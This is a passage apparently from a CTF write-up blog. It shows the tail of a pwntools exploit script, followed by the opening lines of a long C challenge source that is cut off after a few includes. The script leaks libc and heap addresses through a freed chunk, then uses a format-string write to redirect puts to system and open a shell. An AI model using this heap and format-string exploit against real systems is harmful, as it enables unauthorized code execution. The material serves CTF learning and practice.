class="title">delete</span><span class="params">(domain)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">	p.sendline(<span class="string">"4"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"domain:"</span>)</span><br><span class="line">	p.sendline(domain)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(domain)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">	p.sendline(<span class="string">"3"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"domain:"</span>)</span><br><span class="line">	p.sendline(domain)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">()</span>:</span></span><br><span class="line">	add(<span class="string">"leak"</span>,<span class="number">0x100</span>,<span class="string">"p4nda"</span>,<span class="string">"...12345"</span>.ljust(<span class="number">0x20</span>,<span class="string">'b'</span>))</span><br><span class="line">	add(<span class="string">"padding"</span>,<span class="number">0x100</span>,<span class="string">"p4nda"</span>,<span class="string">"...12345"</span>.ljust(<span class="number">0x20</span>,<span class="string">'b'</span>))	</span><br><span class="line">	add(<span class="string">"leak"</span>,<span class="number">0x100</span>,<span class="string">"p4nda"</span>,<span class="string">"...12345"</span>.ljust(<span class="number">0x20</span>,<span class="string">'b'</span>))</span><br><span class="line">	add(<span class="string">"padding"</span>,<span class="number">0x100</span>,<span class="string">"p4nda"</span>,<span class="string">"...12345"</span>.ljust(<span class="number">0x20</span>,<span class="string">'b'</span>))	</span><br><span class="line">	add(<span class="string">"leak"</span>,<span class="number">0x100</span>,<span class="string">"p4nda"</span>,<span class="string">"...12345"</span>.ljust(<span class="number">0x20</span>,<span class="string">'b'</span>))</span><br><span class="line">	add(<span class="string">"padding"</span>,<span class="number">0x100</span>,<span class="string">"p4nda"</span>,<span class="string">"...12345"</span>.ljust(<span class="number">0x20</span>,<span class="string">'b'</span>))	</span><br><span class="line">	delete(<span class="string">"leak"</span>)	</span><br><span class="line">	show(<span class="string">"leak"</span>)</span><br><span class="line"></span><br><span class="line">leak()</span><br><span class="line">p.recvuntil(<span class="string">"IP    : "</span>)</span><br><span class="line">libc.address  = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\0'</span>)) - <span class="number">88</span> - <span class="number">0x10</span> - libc.symbols[<span class="string">"__malloc_hook"</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] system:'</span>,hex(libc.symbols[<span class="string">'system'</span>])</span><br><span class="line">p.recvuntil(<span class="string">"IP    : "</span>)</span><br><span class="line">heap =u64(p.recv(<span class="number">4</span>).ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] heap:'</span>,hex(heap)</span><br><span class="line">add(<span class="string">"fmt"</span>,<span class="number">0x50</span>,<span class="string">"%dp4nda%10$pp4nda%16$pp4nda\0"</span>,<span class="string">"..."</span>.ljust(<span class="number">0x20</span>,<span class="string">'c'</span>))</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)	</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'motto:'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">8</span>):</span><br><span class="line">	<span class="keyword">if</span>(((heap+<span class="number">48</span>)&gt;&gt;(<span class="number">8</span>*i))&amp;<span class="number">0xff</span>) ==<span class="number">0x0a</span>:</span><br><span class="line">		<span class="keyword">print</span> <span class="string">"bad addr"</span></span><br><span class="line">		exit(<span class="number">0</span>)</span><br><span class="line">p.sendline(<span class="string">'/bin/sh\0'</span>+<span class="string">'a'</span>*(<span class="number">0xf0</span><span class="number">-0x10</span><span class="number">-8</span>)+p64(heap+<span class="number">48</span>))</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'name'</span>)</span><br><span class="line">p.sendline(<span class="string">'%6$hn'</span>)</span><br><span class="line">p.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">p.sendline(<span class="string">"3p4nda"</span>+hex(elf.got[<span class="string">'puts'</span>])+<span class="string">"p4nda"</span>+hex(libc.symbols[<span class="string">'system'</span>])+<span class="string">'p4nda'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'motto'</span>)</span><br><span class="line">p.sendline(<span class="string">'p4nda'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="题目源码"><a href="#题目源码" class="headerlink" title="题目源码"></a>题目源码</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br><span class="line">781</span><br><span class="line">782</span><br><span class="line">783</span><br><span class="line">784</span><br><span class="line">785</span><br><span class="line">786</span><br><span class="line">787</span><br><span class="line">788</span><br><span class="line">789</span><br><span class="line">790</span><br><span class="line">791</span><br><span class="line">792</span><br><span class="line">793</span><br><span class="line">794</span><br><span class="line">795</span><br><span class="line">796</span><br><span class="line">797</span><br><span class="line">798</span><br><span class="line">799</span><br><span class="line">800</span><br><span class="line">801</span><br><span class="line">802</span><br><span class="line">803</span><br><span class="line">804</span><br><span class="line">805</span><br><span class="line">806</span><br><span class="line">807</span><br><span class="line">808</span><br><span class="line">809</span><br><span class="line">810</span><br><span class="line">811</span><br><span class="line">812</span><br><span class="line">813</span><br><span class="line">814</span><br><span class="line">815</span><br><span class="line">816</span><br><span class="line">817</span><br><span class="line">818</span><br><span class="line">819</span><br><span class="line">820</span><br><span class="line">821</span><br><span class="line">822</span><br><span class="line">823</span><br><span class="line">824</span><br><span class="line">825</span><br><span class="line">826</span><br><span class="line">827</span><br><span class="line">828</span><br><span class="line">829</span><br><span class="line">830</span><br><span class="line">831</span><br><span class="line">832</span><br><span class="line">833</span><br><span class="line">834</span><br><span class="line">835</span><br><span class="line">836</span><br><span class="line">837</span><br><span class="line">838</span><br><span class="line">839</span><br><span class="line">840</span><br><span class="line">841</span><br><span class="line">842</span><br><span class="line">843</span><br><span class="line">844</span><br><span class="line">845</span><br><span class="line">846</span><br><span class="line">847</span><br><span class="line">848</span><br><span class="line">849</span><br><span class="line">850</span><br><span class="line">851</span><br><span class="line">852</span><br><span class="line">853</span><br><span class="line">854</span><br><span class="line">855</span><br><span class="line">856</span><br><span class="line">857</span><br><span class="line">858</span><br><span class="line">859</span><br><span class="line">860</span><br><span class="line">861</span><br><span class="line">862</span><br><span class="line">863</span><br><span class="line">864</span><br><span class="line">865</span><br><span class="line">866</span><br><span class="line">867</span><br><span class="line">868</span><br><span class="line">869</span><br><span class="line">870</span><br><span class="line">871</span><br><span class="line">872</span><br><span class="line">873</span><br><span class="line">874</span><br><span class="line">875</span><br><span class="line">876</span><br><span class="line">877</span><br><span class="line">878</span><br><span class="line">879</span><br><span class="line">880</span><br><span class="line">881</span><br><span class="line">882</span><br><span class="line">883</span><br><span class="line">884</span><br><span class="line">885</span><br><span class="line">886</span><br><span class="line">887</span><br><span class="line">888</span><br><span class="line">889</span><br><span class="line">890</span><br><span class="line">891</span><br><span class="line">892</span><br><span class="line">893</span><br><span class="line">894</span><br><span class="line">895</span><br><span class="line">896</span><br><span class="line">897</span><br><span class="line">898</span><br><span class="line">899</span><br><span class="line">900</span><br><span class="line">901</span><br><span class="line">902</span><br><span class="line">903</span><br><span class="line">904</span><br><span class="line">905</span><br><span class="line">906</span><br><span class="line">907</span><br><span class="line">908</span><br><span class="line">909</span><br><span class="line">910</span><br><span class="line">911</span><br><span class="line">912</span><br><span class="line">913</span><br><span class="line">914</span><br><span class="line">915</span><br><span class="line">916</span><br><span class="line">917</span><br><span class="line">918</span><br><span class="line">919</span><br><span class="line">920</span><br><span class="line">921</span><br><span class="line">922</span><br><span class="line">923</span><br><span class="line">924</span><br><span class="line">925</span><br><span class="line">926</span><br><span class="line">927</span><br><span class="line">928</span><br><span class="line">929</span><br><span class="line">930</span><br><span class="line">931</span><br><span class="line">932</span><br><span class="line">933</span><br><span class="line">934</span><br><span class="line">935</span><br><span class="line">936</span><br><span class="line">937</span><br><span class="line">938</span><br><span class="line">939</span><br><span class="line">940</span><br><span class="line">941</span><br><span class="line">942</span><br><span class="line">943</span><br><span class="line">944</span><br><span class="line">945</span><br><span class="line">946</span><br><span class="line">947</span><br><span class="line">948</span><br><span class="line">949</span><br><span class="line">950</span><br><span class="line">951</span><br><span class="line">952</span><br><span class="line">953</span><br><span class="line">954</span><br><span class="line">955</span><br><span class="line">956</span><br><span class="line">957</span><br><span class="line">958</span><br><span class="line">959</span><br><span class="line">960</span><br><span class="line">961</span><br><span class="line">962</span><br><span class="line">963</span><br><span class="line">964</span><br><span class="line">965</span><br><span class="line">966</span><br><span class="line">967</span><br><span class="line">968</span><br><span class="line">969</span><br><span class="line">970</span><br><span class="line">971</span><br><span class="line">972</span><br><span class="line">973</span><br><span class="line">974</span><br><span class="line">975</span><br><span class="line">976</span><br><span class="line">977</span><br><span class="line">978</span><br><span class="line">979</span><br><span class="line">980</span><br><span class="line">981</span><br><span class="line">982</span><br><span class="line">983</span><br><span class="line">984</span><br><span class="line">985</span><br><span class="line">986</span><br><span class="line">987</span><br><span class="line">988</span><br><span class="line">989</span><br><span class="line">990</span><br><span class="line">991</span><br><span class="line">992</span><br><span class="line">993</span><br><span class="line">994</span><br><span class="line">995</span><br><span class="line">996</span><br><span class="line">997</span><br><span class="line">998</span><br><span class="line">999</span><br><span class="line">1000</span><br><span class="line">1001</span><br><span class="line">1002</span><br><span class="line">1003</span><br><span class="line">1004</span><br><span class="line">1005</span><br><span class="line">1006</span><br><span class="line">1007</span><br><span class="line">1008</span><br><span class="line">1009</span><br><span class="line">1010</span><br><span class="line">1011</span><br><span class="line">1012</span><br><span class="line">1013</span><br><span class="line">1014</span><br><span class="line">1015</span><br><span class="line">1016</span><br><span class="line">1017</span><br><span class="line">1018</span><br><span class="line">1019</span><br><span class="line">1020</span><br><span class="line">1021</span><br><span class="line">1022</span><br><span class="line">1023</span><br><span class="line">1024</span><br><span class="line">1025</span><br><span class="line">1026</span><br><span class="line">1027</span><br><span class="line">1028</span><br><span class="line">1029</span><br><span class="line">1030</span><br><span class="line">1031</span><br><span class="line">1032</span><br><span class="line">1033</span><br><span class="line">1034</span><br><span class="line">1035</span><br><span class="line">1036</span><br><span class="line">1037</span><br><span class="line">1038</span><br><span class="line">1039</span><br><span class="line">1040</span><br><span class="line">1041</span><br><span class="line">1042</span><br><span class="line">1043</span><br><span class="line">1044</span><br><span class="line">1045</span><br><span class="line">1046</span><br><span class="line">1047</span><br><span class="line">1048</span><br><span class="line">1049</span><br><span class="line">1050</span><br><span class="line">1051</span><br><span class="line">1052</span><br><span class="line">1053</span><br><span class="line">1054</span><br><span class="line">1055</span><br><span class="line">1056</span><br><span class="line">1057</span><br><span class="line">1058</span><br><span class="line">1059</span><br><span class="line">1060</span><br><span class="line">1061</span><br><span class="line">1062</span><br><span class="line">1063</span><br><span class="line">1064</span><br><span class="line">1065</span><br><span class="line">1066</span><br><span class="line">1067</span><br><span class="line">1068</span><br><span class="line">1069</span><br><span class="line">1070</span><br><span class="line">1071</span><br><span class="line">1072</span><br><span class="line">1073</span><br><span class="line">1074</span><br><span class="line">1075</span><br><span class="line">1076</span><br><span class="line">1077</span><br><span class="line">1078</span><br><span class="line">1079</span><br><span class="line">1080</span><br><span class="line">1081</span><br><span class="line">1082</span><br><span class="line">1083</span><br><span class="line">1084</span><br><span class="line">1085</span><br><span class="line">1086</span><br><span class="line">1087</span><br><span class="line">1088</span><br><span class="line">1089</span><br><span class="line">1090</span><br><span class="line">1091</span><br><span class="line">1092</span><br><span class="line">1093</span><br><span class="line">1094</span><br><span class="line">1095</span><br><span class="line">1096</span><br><span class="line">1097</span><br><span class="line">1098</span><br><span class="line">1099</span><br><span class="line">1100</span><br><span class="line">1101</span><br><span class="line">1102</span><br><span class="line">1103</span><br><span class="line">1104</span><br><span class="line">1105</span><br><span class="line">1106</span><br><span class="line">1107</span><br><span class="line">1108</span><br><span class="line">1109</span><br><span class="line">1110</span><br><span class="line">1111</span><br><span class="line">1112</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span 